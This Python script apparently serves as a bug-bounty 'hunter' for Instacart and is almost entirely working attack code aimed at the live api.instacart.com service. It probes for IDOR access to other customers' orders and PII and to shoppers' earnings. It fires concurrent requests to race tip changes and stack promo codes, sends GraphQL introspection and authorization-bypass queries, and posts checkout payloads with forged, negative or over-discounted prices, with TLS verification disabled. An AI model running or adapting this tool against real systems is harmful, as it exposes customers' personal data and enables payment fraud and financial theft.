#!/usr/bin/env python3
"""
Instacart Elite Bug Hunter
Hunter: shadowstep_131

Focus Areas:
- Multi-role IDOR (Customer ↔ Shopper ↔ Merchant)
- Race conditions (tips, promos, assignments)
- GraphQL authorization bypass
- Payment logic manipulation
"""

import requests
import json
import re
import threading
import time
import random
from urllib.parse import urljoin, urlparse
from datetime import datetime
from pathlib import Path
import warnings
warnings.filterwarnings('ignore')

class InstacartHunter:
    """Elite Instacart vulnerability hunter."""
    
    def __init__(self):
        self.hunter = "shadowstep_131"
        self.base_url = "https://api.instacart.com"
        self.web_url = "https://www.instacart.com"
        self.graphql_url = "https://api.instacart.com/graphql"
        self.output_dir = Path(__file__).parent / "findings"
        self.output_dir.mkdir(exist_ok=True)
        
        self.session = requests.Session()
        self.session.headers.update({
            "X-Bug-Bounty": self.hunter,
            "User-Agent": f"Instacart/2.0.0 (Security Research - {self.hunter})",
            "Content-Type": "application/json"
        })
        
        # Auth tokens (to be set)
        self.customer_token = None
        self.shopper_token = None
        self.merchant_token = None
        
        # Test data
        self.test_order_ids = ["12345678", "87654321", "11223344", "44332211"]
        self.test_shopper_ids = ["shopper_001", "shopper_002", "shopper_003"]
        self.test_customer_ids = ["cust_001", "cust_002", "cust_003"]
        
        # Race condition payloads
        self.promo_codes = ["WELCOME10", "FREESHIP", "NEWUSER20", "SAVE15", "FIRST5"]
        
        self.findings = []
    
    def log(self, level: str, message: str):
        """Log with timestamp."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m",
            "WARNING": "\033[93m",
            "CRITICAL": "\033[91m",
            "RESET": "\033[0m"
        }
        color = colors.get(level, colors["RESET"])
        print(f"[{timestamp}] {color}[{level}]{colors['RESET']} {message}")
    
    def add_finding(self, severity: str, title: str, url: str, details: dict):
        """Add a finding to the report."""
        finding = {
            "severity": severity,
            "title": title,
            "url": url,
            "details": details,
            "timestamp": datetime.now().isoformat(),
            "hunter": self.hunter
        }
        self.findings.append(finding)
        self.log("CRITICAL" if severity == "Critical" else "SUCCESS", f"FINDING: {title}")
        self._save_findings()
    
    def _save_findings(self):
        """Save findings to file."""
        output_file = self.output_dir / f"findings_{datetime.now().strftime('%Y%m%d')}.json"
        with open(output_file, "w") as f:
            json.dump(self.findings, f, indent=2)
    
    def set_auth_tokens(self, customer: str = None, shopper: str = None, merchant: str = None):
        """Set authentication tokens."""
        if customer:
            self.customer_token = customer
        if shopper:
            self.shopper_token = shopper
        if merchant:
            self.merchant_token = merchant
    
    # ==================== IDOR HUNTING ====================
    
    def test_customer_idor(self):
        """Test customer IDOR - accessing other customers' orders."""
        self.log("INFO", "Testing Customer IDOR")
        
        if not self.customer_token:
            self.log("WARNING", "No customer token set")
            return
        
        headers = {"Authorization": f"Bearer {self.customer_token}"}
        
        # Test accessing other customers' orders
        for order_id in self.test_order_ids:
            url = f"{self.base_url}/v1/orders/{order_id}"
            
            try:
                resp = self.session.get(url, headers=headers, timeout=10, verify=False)
                
                if resp.status_code == 200 and len(resp.text) > 100:
                    # Look for PII in response
                    pii_patterns = [
                        r'"email":\s*"[^"]+@[^"]+"',
                        r'"phone":\s*"[0-9\-\+]+"',
                        r'"address":\s*"[^"]+"',
                        r'"name":\s*"[^"]+"',
                        r'"card":\s*"[^"]+"'
                    ]
                    
                    for pattern in pii_patterns:
                        if re.search(pattern, resp.text):
                            self.add_finding(
                                severity="High",
                                title="Customer IDOR - Access to Other Customer's Order",
                                url=url,
                                details={
                                    "order_id": order_id,
                                    "data_exposed": pattern,
                                    "response_snippet": resp.text[:300],
                                    "impact": "PII exposure, order details access"
                                }
                            )
                            break
                            
            except Exception as e:
                self.log("WARNING", f"IDOR test failed for {order_id}: {e}")
    
    def test_cross_role_idor(self):
        """Test cross-role IDOR - customer accessing shopper data."""
        self.log("INFO", "Testing Cross-Role IDOR")
        
        # Customer accessing shopper earnings
        if self.customer_token:
            headers = {"Authorization": f"Bearer {self.customer_token}"}
            
            for shopper_id in self.test_shopper_ids:
                url = f"{self.base_url}/v1/earnings/{shopper_id}"
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=10, verify=False)
                    
                    if resp.status_code == 200 and len(resp.text) > 100:
                        # Look for financial data
                        if re.search(r'"total":\s*\d+', resp.text) or re.search(r'"earnings"', resp.text):
                            self.add_finding(
                                severity="High",
                                title="Cross-Role IDOR - Customer Accessing Shopper Earnings",
                                url=url,
                                details={
                                    "shopper_id": shopper_id,
                                    "attacker_role": "customer",
                                    "target_role": "shopper",
                                    "response_snippet": resp.text[:300]
                                }
                            )
                            
                except Exception as e:
                    pass
        
        # Shopper accessing customer orders
        if self.shopper_token:
            headers = {"Authorization": f"Bearer {self.shopper_token}"}
            
            for customer_id in self.test_customer_ids:
                url = f"{self.base_url}/v1/customers/{customer_id}/orders"
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=10, verify=False)
                    
                    if resp.status_code == 200 and len(resp.text) > 100:
                        if re.search(r'"order_id"', resp.text):
                            self.add_finding(
                                severity="High",
                                title="Cross-Role IDOR - Shopper Accessing Customer Orders",
                                url=url,
                                details={
                                    "customer_id": customer_id,
                                    "attacker_role": "shopper",
                                    "target_role": "customer"
                                }
                            )
                            
                except Exception as e:
                    pass
    
    # ==================== RACE CONDITION HUNTING ====================
    
    def test_tip_race_condition(self, order_id: str = "12345678"):
        """Test tip modification race condition."""
        self.log("INFO", f"Testing Tip Race Condition on Order {order_id}")
        
        if not self.customer_token:
            self.log("WARNING", "No customer token set")
            return
        
        headers = {"Authorization": f"Bearer {self.customer_token}"}
        results = []
        
        def modify_tip(amount):
            try:
                resp = self.session.post(
                    f"{self.base_url}/v1/tips",
                    headers=headers,
                    json={"order_id": order_id, "amount": amount},
                    timeout=10,
                    verify=False
                )
                results.append({
                    "amount": amount,
                    "status": resp.status_code,
                    "response": resp.text[:200]
                })
            except Exception as e:
                results.append({"amount": amount, "error": str(e)})
        
        # Launch concurrent tip modifications
        threads = []
        tip_amounts = [10, 20, 30, 40, 50]
        
        for amount in tip_amounts:
            for _ in range(3):  # Try each amount 3 times
                t = threading.Thread(target=modify_tip, args=(amount,))
                threads.append(t)
                t.start()
        
        for t in threads:
            t.join()
        
        # Analyze results for race condition
        success_count = sum(1 for r in results if r.get("status") == 200)
        
        if success_count > len(tip_amounts):  # More successes than unique amounts
            self.add_finding(
                severity="Critical",
                title="Tip Race Condition - Multiple Tip Modifications Accepted",
                url=f"{self.base_url}/v1/tips",
                details={
                    "order_id": order_id,
                    "concurrent_requests": len(threads),
                    "successful_requests": success_count,
                    "unique_amounts": len(tip_amounts),
                    "impact": "Financial theft, tip manipulation"
                }
            )
    
    def test_promo_stacking(self, order_id: str = "12345678"):
        """Test promo code stacking race condition."""
        self.log("INFO", f"Testing Promo Code Stacking on Order {order_id}")
        
        if not self.customer_token:
            self.log("WARNING", "No customer token set")
            return
        
        headers = {"Authorization": f"Bearer {self.customer_token}"}
        results = []
        
        def apply_promo(code):
            try:
                resp = self.session.post(
                    f"{self.base_url}/v1/promos/apply",
                    headers=headers,
                    json={"code": code, "order_id": order_id},
                    timeout=10,
                    verify=False
                )
                results.append({
                    "code": code,
                    "status": resp.status_code,
                    "response": resp.text[:200]
                })
            except Exception as e:
                results.append({"code": code, "error": str(e)})
        
        # Launch concurrent promo applications
        threads = []
        
        for code in self.promo_codes:
            for _ in range(3):  # Try each code 3 times
                t = threading.Thread(target=apply_promo, args=(code,))
                threads.append(t)
                t.start()
        
        for t in threads:
            t.join()
        
        # Analyze for successful stacking
        success_count = sum(1 for r in results if r.get("status") == 200)
        
        if success_count > 1:  # More than 1 promo applied
            self.add_finding(
                severity="High",
                title="Promo Code Stacking - Multiple Discounts Applied",
                url=f"{self.base_url}/v1/promos/apply",
                details={
                    "order_id": order_id,
                    "concurrent_requests": len(threads),
                    "successful_promos": success_count,
                    "promo_codes": self.promo_codes,
                    "impact": "Free food, financial loss"
                }
            )
    
    # ==================== GRAPHQL HUNTING ====================
    
    def test_graphql_introspection(self):
        """Test GraphQL introspection."""
        self.log("INFO", "Testing GraphQL Introspection")
        
        headers = {"Authorization": f"Bearer {self.customer_token or ''}"}
        
        introspection_query = {
            "query": """
            query IntrospectionQuery {
                __schema {
                    queryType { name }
                    mutationType { name }
                    subscriptionType { name }
                    types {
                        name
                        kind
                        fields {
                            name
                            type { name kind }
                        }
                    }
                }
            }
            """
        }
        
        try:
            resp = self.session.post(
                self.graphql_url,
                headers=headers,
                json=introspection_query,
                timeout=15,
                verify=False
            )
            
            if resp.status_code == 200 and "__schema" in resp.text:
                self.add_finding(
                    severity="Medium",
                    title="GraphQL Introspection Enabled",
                    url=self.graphql_url,
                    details={
                        "schema_size": len(resp.text),
                        "impact": "Full schema disclosure aids further attacks",
                        "next_steps": "Enumerate queries/mutations for auth bypass"
                    }
                )
                
                # Save schema
                schema_file = self.output_dir / "graphql_schema.json"
                with open(schema_file, "w") as f:
                    f.write(resp.text)
                    
        except Exception as e:
            self.log("WARNING", f"GraphQL introspection failed: {e}")
    
    def test_graphql_auth_bypass(self):
        """Test GraphQL authorization bypass."""
        self.log("INFO", "Testing GraphQL Authorization Bypass")
        
        # Test queries that should be restricted
        test_queries = [
            # Customer accessing shopper data
            {
                "query": """
                query GetShopperEarnings($shopperId: ID!) {
                    shopper(id: $shopperId) {
                        id
                        earnings {
                            total
                            pending
                            currency
                        }
                    }
                }
                """,
                "variables": {"shopperId": "shopper_001"}
            },
            # Shopper accessing customer data
            {
                "query": """
                query GetCustomerOrders($customerId: ID!) {
                    customer(id: $customerId) {
                        id
                        orders {
                            id
                            items {
                                name
                                price
                                quantity
                            }
                            total
                        }
                    }
                }
                """,
                "variables": {"customerId": "cust_001"}
            },
            # Unauthorized order modification
            {
                "query": """
                mutation UpdateOrder($orderId: ID!, $tip: Float!) {
                    updateOrder(id: $orderId, tip: $tip) {
                        id
                        tip
                        status
                    }
                }
                """,
                "variables": {"orderId": "12345678", "tip": 999.99}
            }
        ]
        
        # Test with customer token
        if self.customer_token:
            headers = {"Authorization": f"Bearer {self.customer_token}"}
            
            for i, query in enumerate(test_queries):
                try:
                    resp = self.session.post(
                        self.graphql_url,
                        headers=headers,
                        json=query,
                        timeout=10,
                        verify=False
                    )
                    
                    if resp.status_code == 200:
                        data = resp.json()
                        
                        # Check if unauthorized data returned
                        if "data" in data and data["data"]:
                            # Look for sensitive data
                            response_text = json.dumps(data).lower()
                            
                            if ("earnings" in response_text or 
                                "orders" in response_text or 
                                ("updateorder" in response_text and "success" in response_text)):
                                
                                self.add_finding(
                                    severity="High",
                                    title="GraphQL Authorization Bypass",
                                    url=self.graphql_url,
                                    details={
                                        "query_index": i,
                                        "query_type": "query" if "query" in query["query"] else "mutation",
                                        "unauthorized_access": True,
                                        "response_data": data
                                    }
                                )
                                
                except Exception as e:
                    pass
    
    # ==================== PAYMENT LOGIC HUNTING ====================
    
    def test_checkout_manipulation(self):
        """Test checkout price manipulation."""
        self.log("INFO", "Testing Checkout Price Manipulation")
        
        if not self.customer_token:
            self.log("WARNING", "No customer token set")
            return
        
        headers = {"Authorization": f"Bearer {self.customer_token}"}
        
        # Manipulated checkout payloads
        test_payloads = [
            {
                "name": "Price Manipulation",
                "payload": {
                    "order_id": "12345678",
                    "items": [
                        {"id": "item_1", "quantity": 2, "price": 0.01},  # Manipulated price
                        {"id": "item_2", "quantity": 1, "price": 0.01}
                    ],
                    "subtotal": 0.03,  # Manipulated total
                    "tax": 0.00,
                    "total": 0.03,
                    "promo_discount": 0.00
                }
            },
            {
                "name": "Excessive Discount",
                "payload": {
                    "order_id": "12345678",
                    "items": [
                        {"id": "item_1", "quantity": 2, "price": 10.00},
                        {"id": "item_2", "quantity": 1, "price": 15.00}
                    ],
                    "subtotal": 35.00,
                    "tax": 3.50,
                    "total": 38.50,
                    "promo_discount": 50.00  # Excessive discount
                }
            },
            {
                "name": "Negative Price",
                "payload": {
                    "order_id": "12345678",
                    "items": [
                        {"id": "item_1", "quantity": 2, "price": -10.00}  # Negative price
                    ],
                    "subtotal": -20.00,
                    "tax": -2.00,
                    "total": -22.00,
                    "promo_discount": 0.00
                }
            }
        ]
        
        for test in test_payloads:
            try:
                resp = self.session.post(
                    f"{self.base_url}/v1/checkout",
                    headers=headers,
                    json=test["payload"],
                    timeout=10,
                    verify=False
                )
                
                # Check if manipulation succeeded
                if resp.status_code in [200, 201]:
                    response_data = resp.json()
                    
                    # Look for successful checkout with manipulated prices
                    if ("order_id" in str(response_data) or 
                        "success" in str(response_data).lower()):
                        
                        self.add_finding(
                            severity="Critical",
                            title=f"Checkout Manipulation - {test['name']}",
                            url=f"{self.base_url}/v1/checkout",
                            details={
                                "manipulation_type": test["name"],
                                "payload": test["payload"],
                                "response": response_data,
                                "impact": "Free groceries, financial loss"
                            }
                        )
                        
            except Exception as e:
                pass
    
    # ==================== MAIN HUNT WORKFLOW ====================
    
    def run_full_hunt(self):
        """Run complete hunting workflow."""
        self.log("INFO", "=" * 60)
        self.log("INFO", "INSTACART ELITE HUNTER - shadowstep_131")
        self.log("INFO", "=" * 60)
        
        # Phase 1: GraphQL
        self.log("INFO", "Phase 1: GraphQL Testing")
        self.test_graphql_introspection()
        self.test_graphql_auth_bypass()
        
        # Phase 2: IDOR
        self.log("INFO", "Phase 2: IDOR Testing")
        self.test_customer_idor()
        self.test_cross_role_idor()
        
        # Phase 3: Race Conditions
        self.log("INFO", "Phase 3: Race Condition Testing")
        self.test_tip_race_condition()
        self.test_promo_stacking()
        
        # Phase 4: Payment Logic
        self.log("INFO", "Phase 4: Payment Logic Testing")
        self.test_checkout_manipulation()
        
        # Summary
        self.log("INFO", "=" * 60)
        self.log("INFO", f"HUNT COMPLETE - {len(self.findings)} findings")
        self.log("INFO", "=" * 60)
        
        # Generate report
        self.generate_report()
    
    def generate_report(self):
        """Generate markdown report."""
        report_file = self.output_dir / f"INSTACART_REPORT_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        
        with open(report_file, "w") as f:
            f.write("# Instacart Bug Bounty Report\n\n")
            f.write(f"**Hunter:** shadowstep_131\n")
            f.write(f"**Date:** {datetime.now().isoformat()}\n\n")
            
            if not self.findings:
                f.write("No findings to report.\n")
            else:
                f.write(f"## Summary: {len(self.findings)} Findings\n\n")
                
                for i, finding in enumerate(self.findings, 1):
                    f.write(f"### {i}. [{finding['severity']}] {finding['title']}\n\n")
                    f.write(f"**URL:** `{finding['url']}`\n\n")
                    f.write("**Details:**\n```json\n")
                    f.write(json.dumps(finding['details'], indent=2))
                    f.write("\n```\n\n---\n\n")
        
        self.log("SUCCESS", f"Report saved: {report_file}")


def main():
    hunter = InstacartHunter()
    
    # Set auth tokens (would need to be obtained manually)
    # hunter.set_auth_tokens(
    #     customer="customer_token_here",
    #     shopper="shopper_token_here",
    #     merchant="merchant_token_here"
    # )
    
    hunter.run_full_hunt()


if __name__ == "__main__":
    main()
